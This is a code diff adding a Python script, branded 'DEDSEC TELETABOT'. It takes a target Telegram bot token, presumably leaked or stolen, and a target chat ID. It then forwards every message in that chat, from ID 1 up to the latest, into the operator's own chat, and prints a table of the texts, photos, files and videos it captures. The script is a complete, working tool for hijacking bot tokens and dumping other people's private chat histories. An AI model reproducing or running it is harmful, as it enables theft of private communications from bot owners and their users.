@@ -1,0 +1,233 @@
+#!/usr/bin/python3
+#coded by 0xbit
+
+import requests
+import os
+import asyncio
+import signal
+import time
+from telethon import TelegramClient as Client
+from tabulate import tabulate
+
+RESET = "\033[0m"
+GREEN = "\033[92m"
+RED = "\033[91m"
+green_dot = '[\033[92m●\033[0m]'
+red_dot = '[\033[91m●\033[0m]'
+green_command = '[\033[92m+\033[0m]'
+green_q = '[\033[92m?\033[0m]'
+red_warning = '[\033[91m!\033[0m]'
+
+def signal_handler(sig, frame):
+    print(f"\n\n\t {red_warning} Process interrupted. Exiting...\n")
+    exit(0)
+
+signal.signal(signal.SIGINT, signal_handler)
+    
+def banner():
+    os.system('clear')
+    text = f'''
+
+
+                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣧⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣧⠀⠀⠀⢰⡿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡟⡆⠀⠀⣿⡇⢻⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⣿⠀⢰⣿⡇⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡄⢸⠀⢸⣿⡇⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⡇⢸⡄⠸⣿⡇⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⢸⡅⠀⣿⢠⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣥⣾⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀
+                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⡿⡿⣿⣿⡿⡅⠀⠀⠀⠀⠀⠀⠀⠀
+                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠉⠀⠉⡙⢔⠛⣟⢋⠦⢵⠀⠀⠀⠀⠀⠀⠀
+                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣄⠀⠀⠁⣿⣯⡥⠃⠀⢳⠀⠀⠀⠀⠀⠀⠀
+                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⡇⠀⠀⠀⠐⠠⠊⢀⠀⢸⠀⠀⠀⠀⠀⠀⠀
+                ⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⡿⠀⠀⠀⠀⠀⠈⠁⠀⠀⠘⣿⣄⠀⠀⠀⠀⠀
+                ⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣷⡀⠀⠀⠀
+                ⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣧⠀⠀
+                ⠀⠀⠀⡜⣭⠤⢍⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⢛⢭⣗⠀
+                ⠀⠀⠀⠁⠈⠀⠀⣀⠝⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⠠⠀⠀⠰⡅
+                ⠀⠀⠀⢀⠀⠀⡀⠡⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠔⠠⡕⠀
+                ⠀⠀⠀⠀⣿⣷⣶⠒⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠀⠀⠀⠀
+                ⠀⠀⠀⠀⠘⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⠀⠀⠀⠀⠀
+                ⠀⠀⠀⠀⠀⠈⢿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠊⠉⢆⠀⠀⠀⠀
+                ⠀⢀⠤⠀⠀⢤⣤⣽⣿⣿⣦⣀⢀⡠⢤⡤⠄⠀⠒⠀⠁⠀⠀⠀⢘⠔⠀⠀⠀
+                ⠀⠀⠀⡐⠈⠁⠈⠛⣛⠿⠟⠑⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+                ⠀⠀⠉⠑⠒⠀⠁⠀⠀⠀⠀⠀⠀{GREEN}DEDSEC TELETABOT {RESET}Coded by: {GREEN}0xbit{RESET}
+    '''
+    print(text)
+
+def get_me(bot_token):
+    url = f"https://api.telegram.org/bot{bot_token}/getMe"
+    r = requests.get(url)
+    data = r.json()
+    return data.get("result") if data.get("ok") else None
+
+def get_updates(bot_token):
+    url = f"https://api.telegram.org/bot{bot_token}/getUpdates"
+    r = requests.get(url)
+    data = r.json()
+    if data.get("ok") and data["result"]:
+        last_update = data["result"][-1]
+        return last_update["message"]["chat"]["id"], last_update["message"]["message_id"]
+    return None, None
+
+def forward_message(bot_token, from_chat_id, to_chat_id, message_id):
+    url = f"https://api.telegram.org/bot{bot_token}/forwardMessage"
+    payload = {"from_chat_id": from_chat_id, "chat_id": to_chat_id, "message_id": message_id}
+    r = requests.post(url, json=payload)
+    response = r.json()
+    if response.get("ok", False):
+        message_result = response.get("result", {})
+        if "text" in message_result:
+            message_data = message_result["text"]
+            content_type = "Text"
+        elif "photo" in message_result:
+            message_data = "[Photo]"
+            content_type = "Image"
+        elif "document" in message_result:
+            message_data = message_result["document"].get("file_name", "[Document]")
+            content_type = "File"
+        elif "video" in message_result:
+            message_data = "[Video]"
+            content_type = "Video"
+        else:
+            message_data = "[Unknown Content]"
+            content_type = "Unknown"
+        
+        table_data = [[message_id, content_type, message_data]]
+        formatted_output = tabulate(table_data, headers=[f"{GREEN}ID{RESET}", f"{GREEN}TYPE{RESET}", f"{GREEN}CONTENT{RESET}"], tablefmt="grid")
+        print("\n" + '\n'.join(['\t ' + line for line in formatted_output.split('\n')]))
+    else:
+        print(f"\n\t {red_warning} Failed to forward message ID {message_id}")
+
+async def send_start_message(bot_username):
+    client = Client(".session", api_id, api_hash)
+    await client.start(phone_number)
+    await client.send_message(bot_username, "/start")
+    await client.disconnect()
+
+def check_cred_status():
+    global api_id, api_hash, phone_number
+
+    if not os.path.exists(".cred.api"):
+        with open(".cred.api", "w") as f:
+            f.write('')
+        
+    with open(".cred.api", "r") as f:
+        lines = f.readlines()
+        
+        if len(lines) < 3:
+            return False
+        else:
+            api_id = lines[0].strip()
+            api_hash = lines[1].strip()
+            phone_number = lines[2].strip()
+            return True
+        
+def set_telegram_creds():
+    while True:
+        print(f'\n\t {green_command} Example format: 75213784')
+        api_id = input(f"\t {green_q} API ID: ").strip()
+        if not api_id.isdigit():
+            print(f"\n\t {red_warning} Invalid bot id!")
+            continue
+        print(f'\n\t {green_command} Example format: 59e2c87e5035a55b36605ed6ec10b3a8')
+        api_hash = input(f"\t {green_q} API HASH: ").strip()
+        if not api_hash:
+            print(f"\n\t {red_warning} Invalid hash!")
+            continue
+        print(f'\n\t {green_command} Example format: +8613876543210')
+        phone_number = input(f"\t {green_q} PHONE NUMBER: ").strip()
+        if not phone_number:
+            print(f"\n\t {red_warning} Invalid phone number!")
+            continue
+
+        print(f'\n\t {green_dot} REVIEW YOUR INFORMATION:')
+        print(f"\n\t {green_dot} API ID: {GREEN}{api_id}{RESET} \n\t {green_dot} API HASH: {GREEN}{api_hash}{RESET} \n\t {green_dot} PHONE NUMBER: {GREEN}{phone_number}{RESET}")
+    
+        select = input(f'\n\t {green_q} IS THIS INFORMATION CORRECT? [Y/n]: ').lower().strip()
+        if select == 'y':
+            with open(".cred.api", "w") as f:
+                f.write(api_id + "\n" + api_hash + "\n" + phone_number)
+        elif select == 'n':
+            banner()
+            continue
+        else:
+            print(f"\n\t {red_warning} Invalid option!")
+            return main()
+                
+        return main()
+
+def set_cred():
+    banner()
+    if token_check:
+        print(f"\n\t {green_dot} API ID: {GREEN}{api_id}{RESET} \n\t {green_dot} API HASH: {GREEN}{api_hash}{RESET} \n\t {green_dot} PHONE NUMBER: {GREEN}{phone_number}{RESET}")
+        select = input(f'\n\t [1]. Change\n\t [2]. Back\n\n\t {green_q} SELECT: ')
+        if select == '1':
+            set_telegram_creds()
+        elif select == '2':
+            main()
+        else:
+            print(f"\n\t {red_warning} Invalid option!")
+            time.sleep(1)
+            set_cred()
+    else:
+        set_telegram_creds()
+            
+def start_dump():
+    if not token_check:
+        print(f"\n\t {red_warning} SET TELEGRAM API FIRST!")
+        time.sleep(1)
+        main()
+    
+    banner()
+    print(f'\n\t {green_command} Example: 6958062342:AAEekaY-nd6n1ORC9lcBqZ0GCo2Vt4NLkB8')
+    bot_token = input(f"\t {green_q} TARGET BOT TOKEN: ")
+    bot_info = get_me(bot_token)
+    
+    if not bot_info:
+        print(f"\n\t {red_warning} Invalid bot token!")
+        return
+    
+    bot_username = bot_info.get("username", "")
+    print(f"\n\t {green_dot} BOT USERNAME: {GREEN}@{bot_username}{RESET}")
+    asyncio.run(send_start_message(bot_username))
+    
+    my_chat_id, last_msg_id = get_updates(bot_token)
+    if not my_chat_id:
+        print(f"\n\t {red_warning} Failed to retrieve chat ID.")
+        return
+    
+    print(f'\n\t {green_command} Example: 6943628300')
+    attacker_chat_id = input(f"\t {green_q} TARGET CHAT ID: ")
+    
+    for msg_id in range(1, last_msg_id + 1):
+        forward_message(bot_token, attacker_chat_id, my_chat_id, msg_id)
+
+def main():
+    banner()
+    global token_check
+    token_check = check_cred_status()
+
+    t_stat = f'{green_dot}' if token_check else f'{red_dot}'
+
+    text = f'''
+         [1]. START
+         [2]. SET TELEGRAM API {t_stat} 
+         [0]. {RED}EXIT{RESET}
+    '''
+    print(text)
+    option = input(f'\t {green_q} Option: ')
+    if option == '1':
+        start_dump()
+    elif option == '2':
+        set_cred()
+    elif option == '0':
+        exit(f'\n\t {green_dot} Exiting...')
+    else:
+        print(f"\n\t {red_warning} Invalid option!")
+        option()
+    
+if __name__ == "__main__":
+    main()
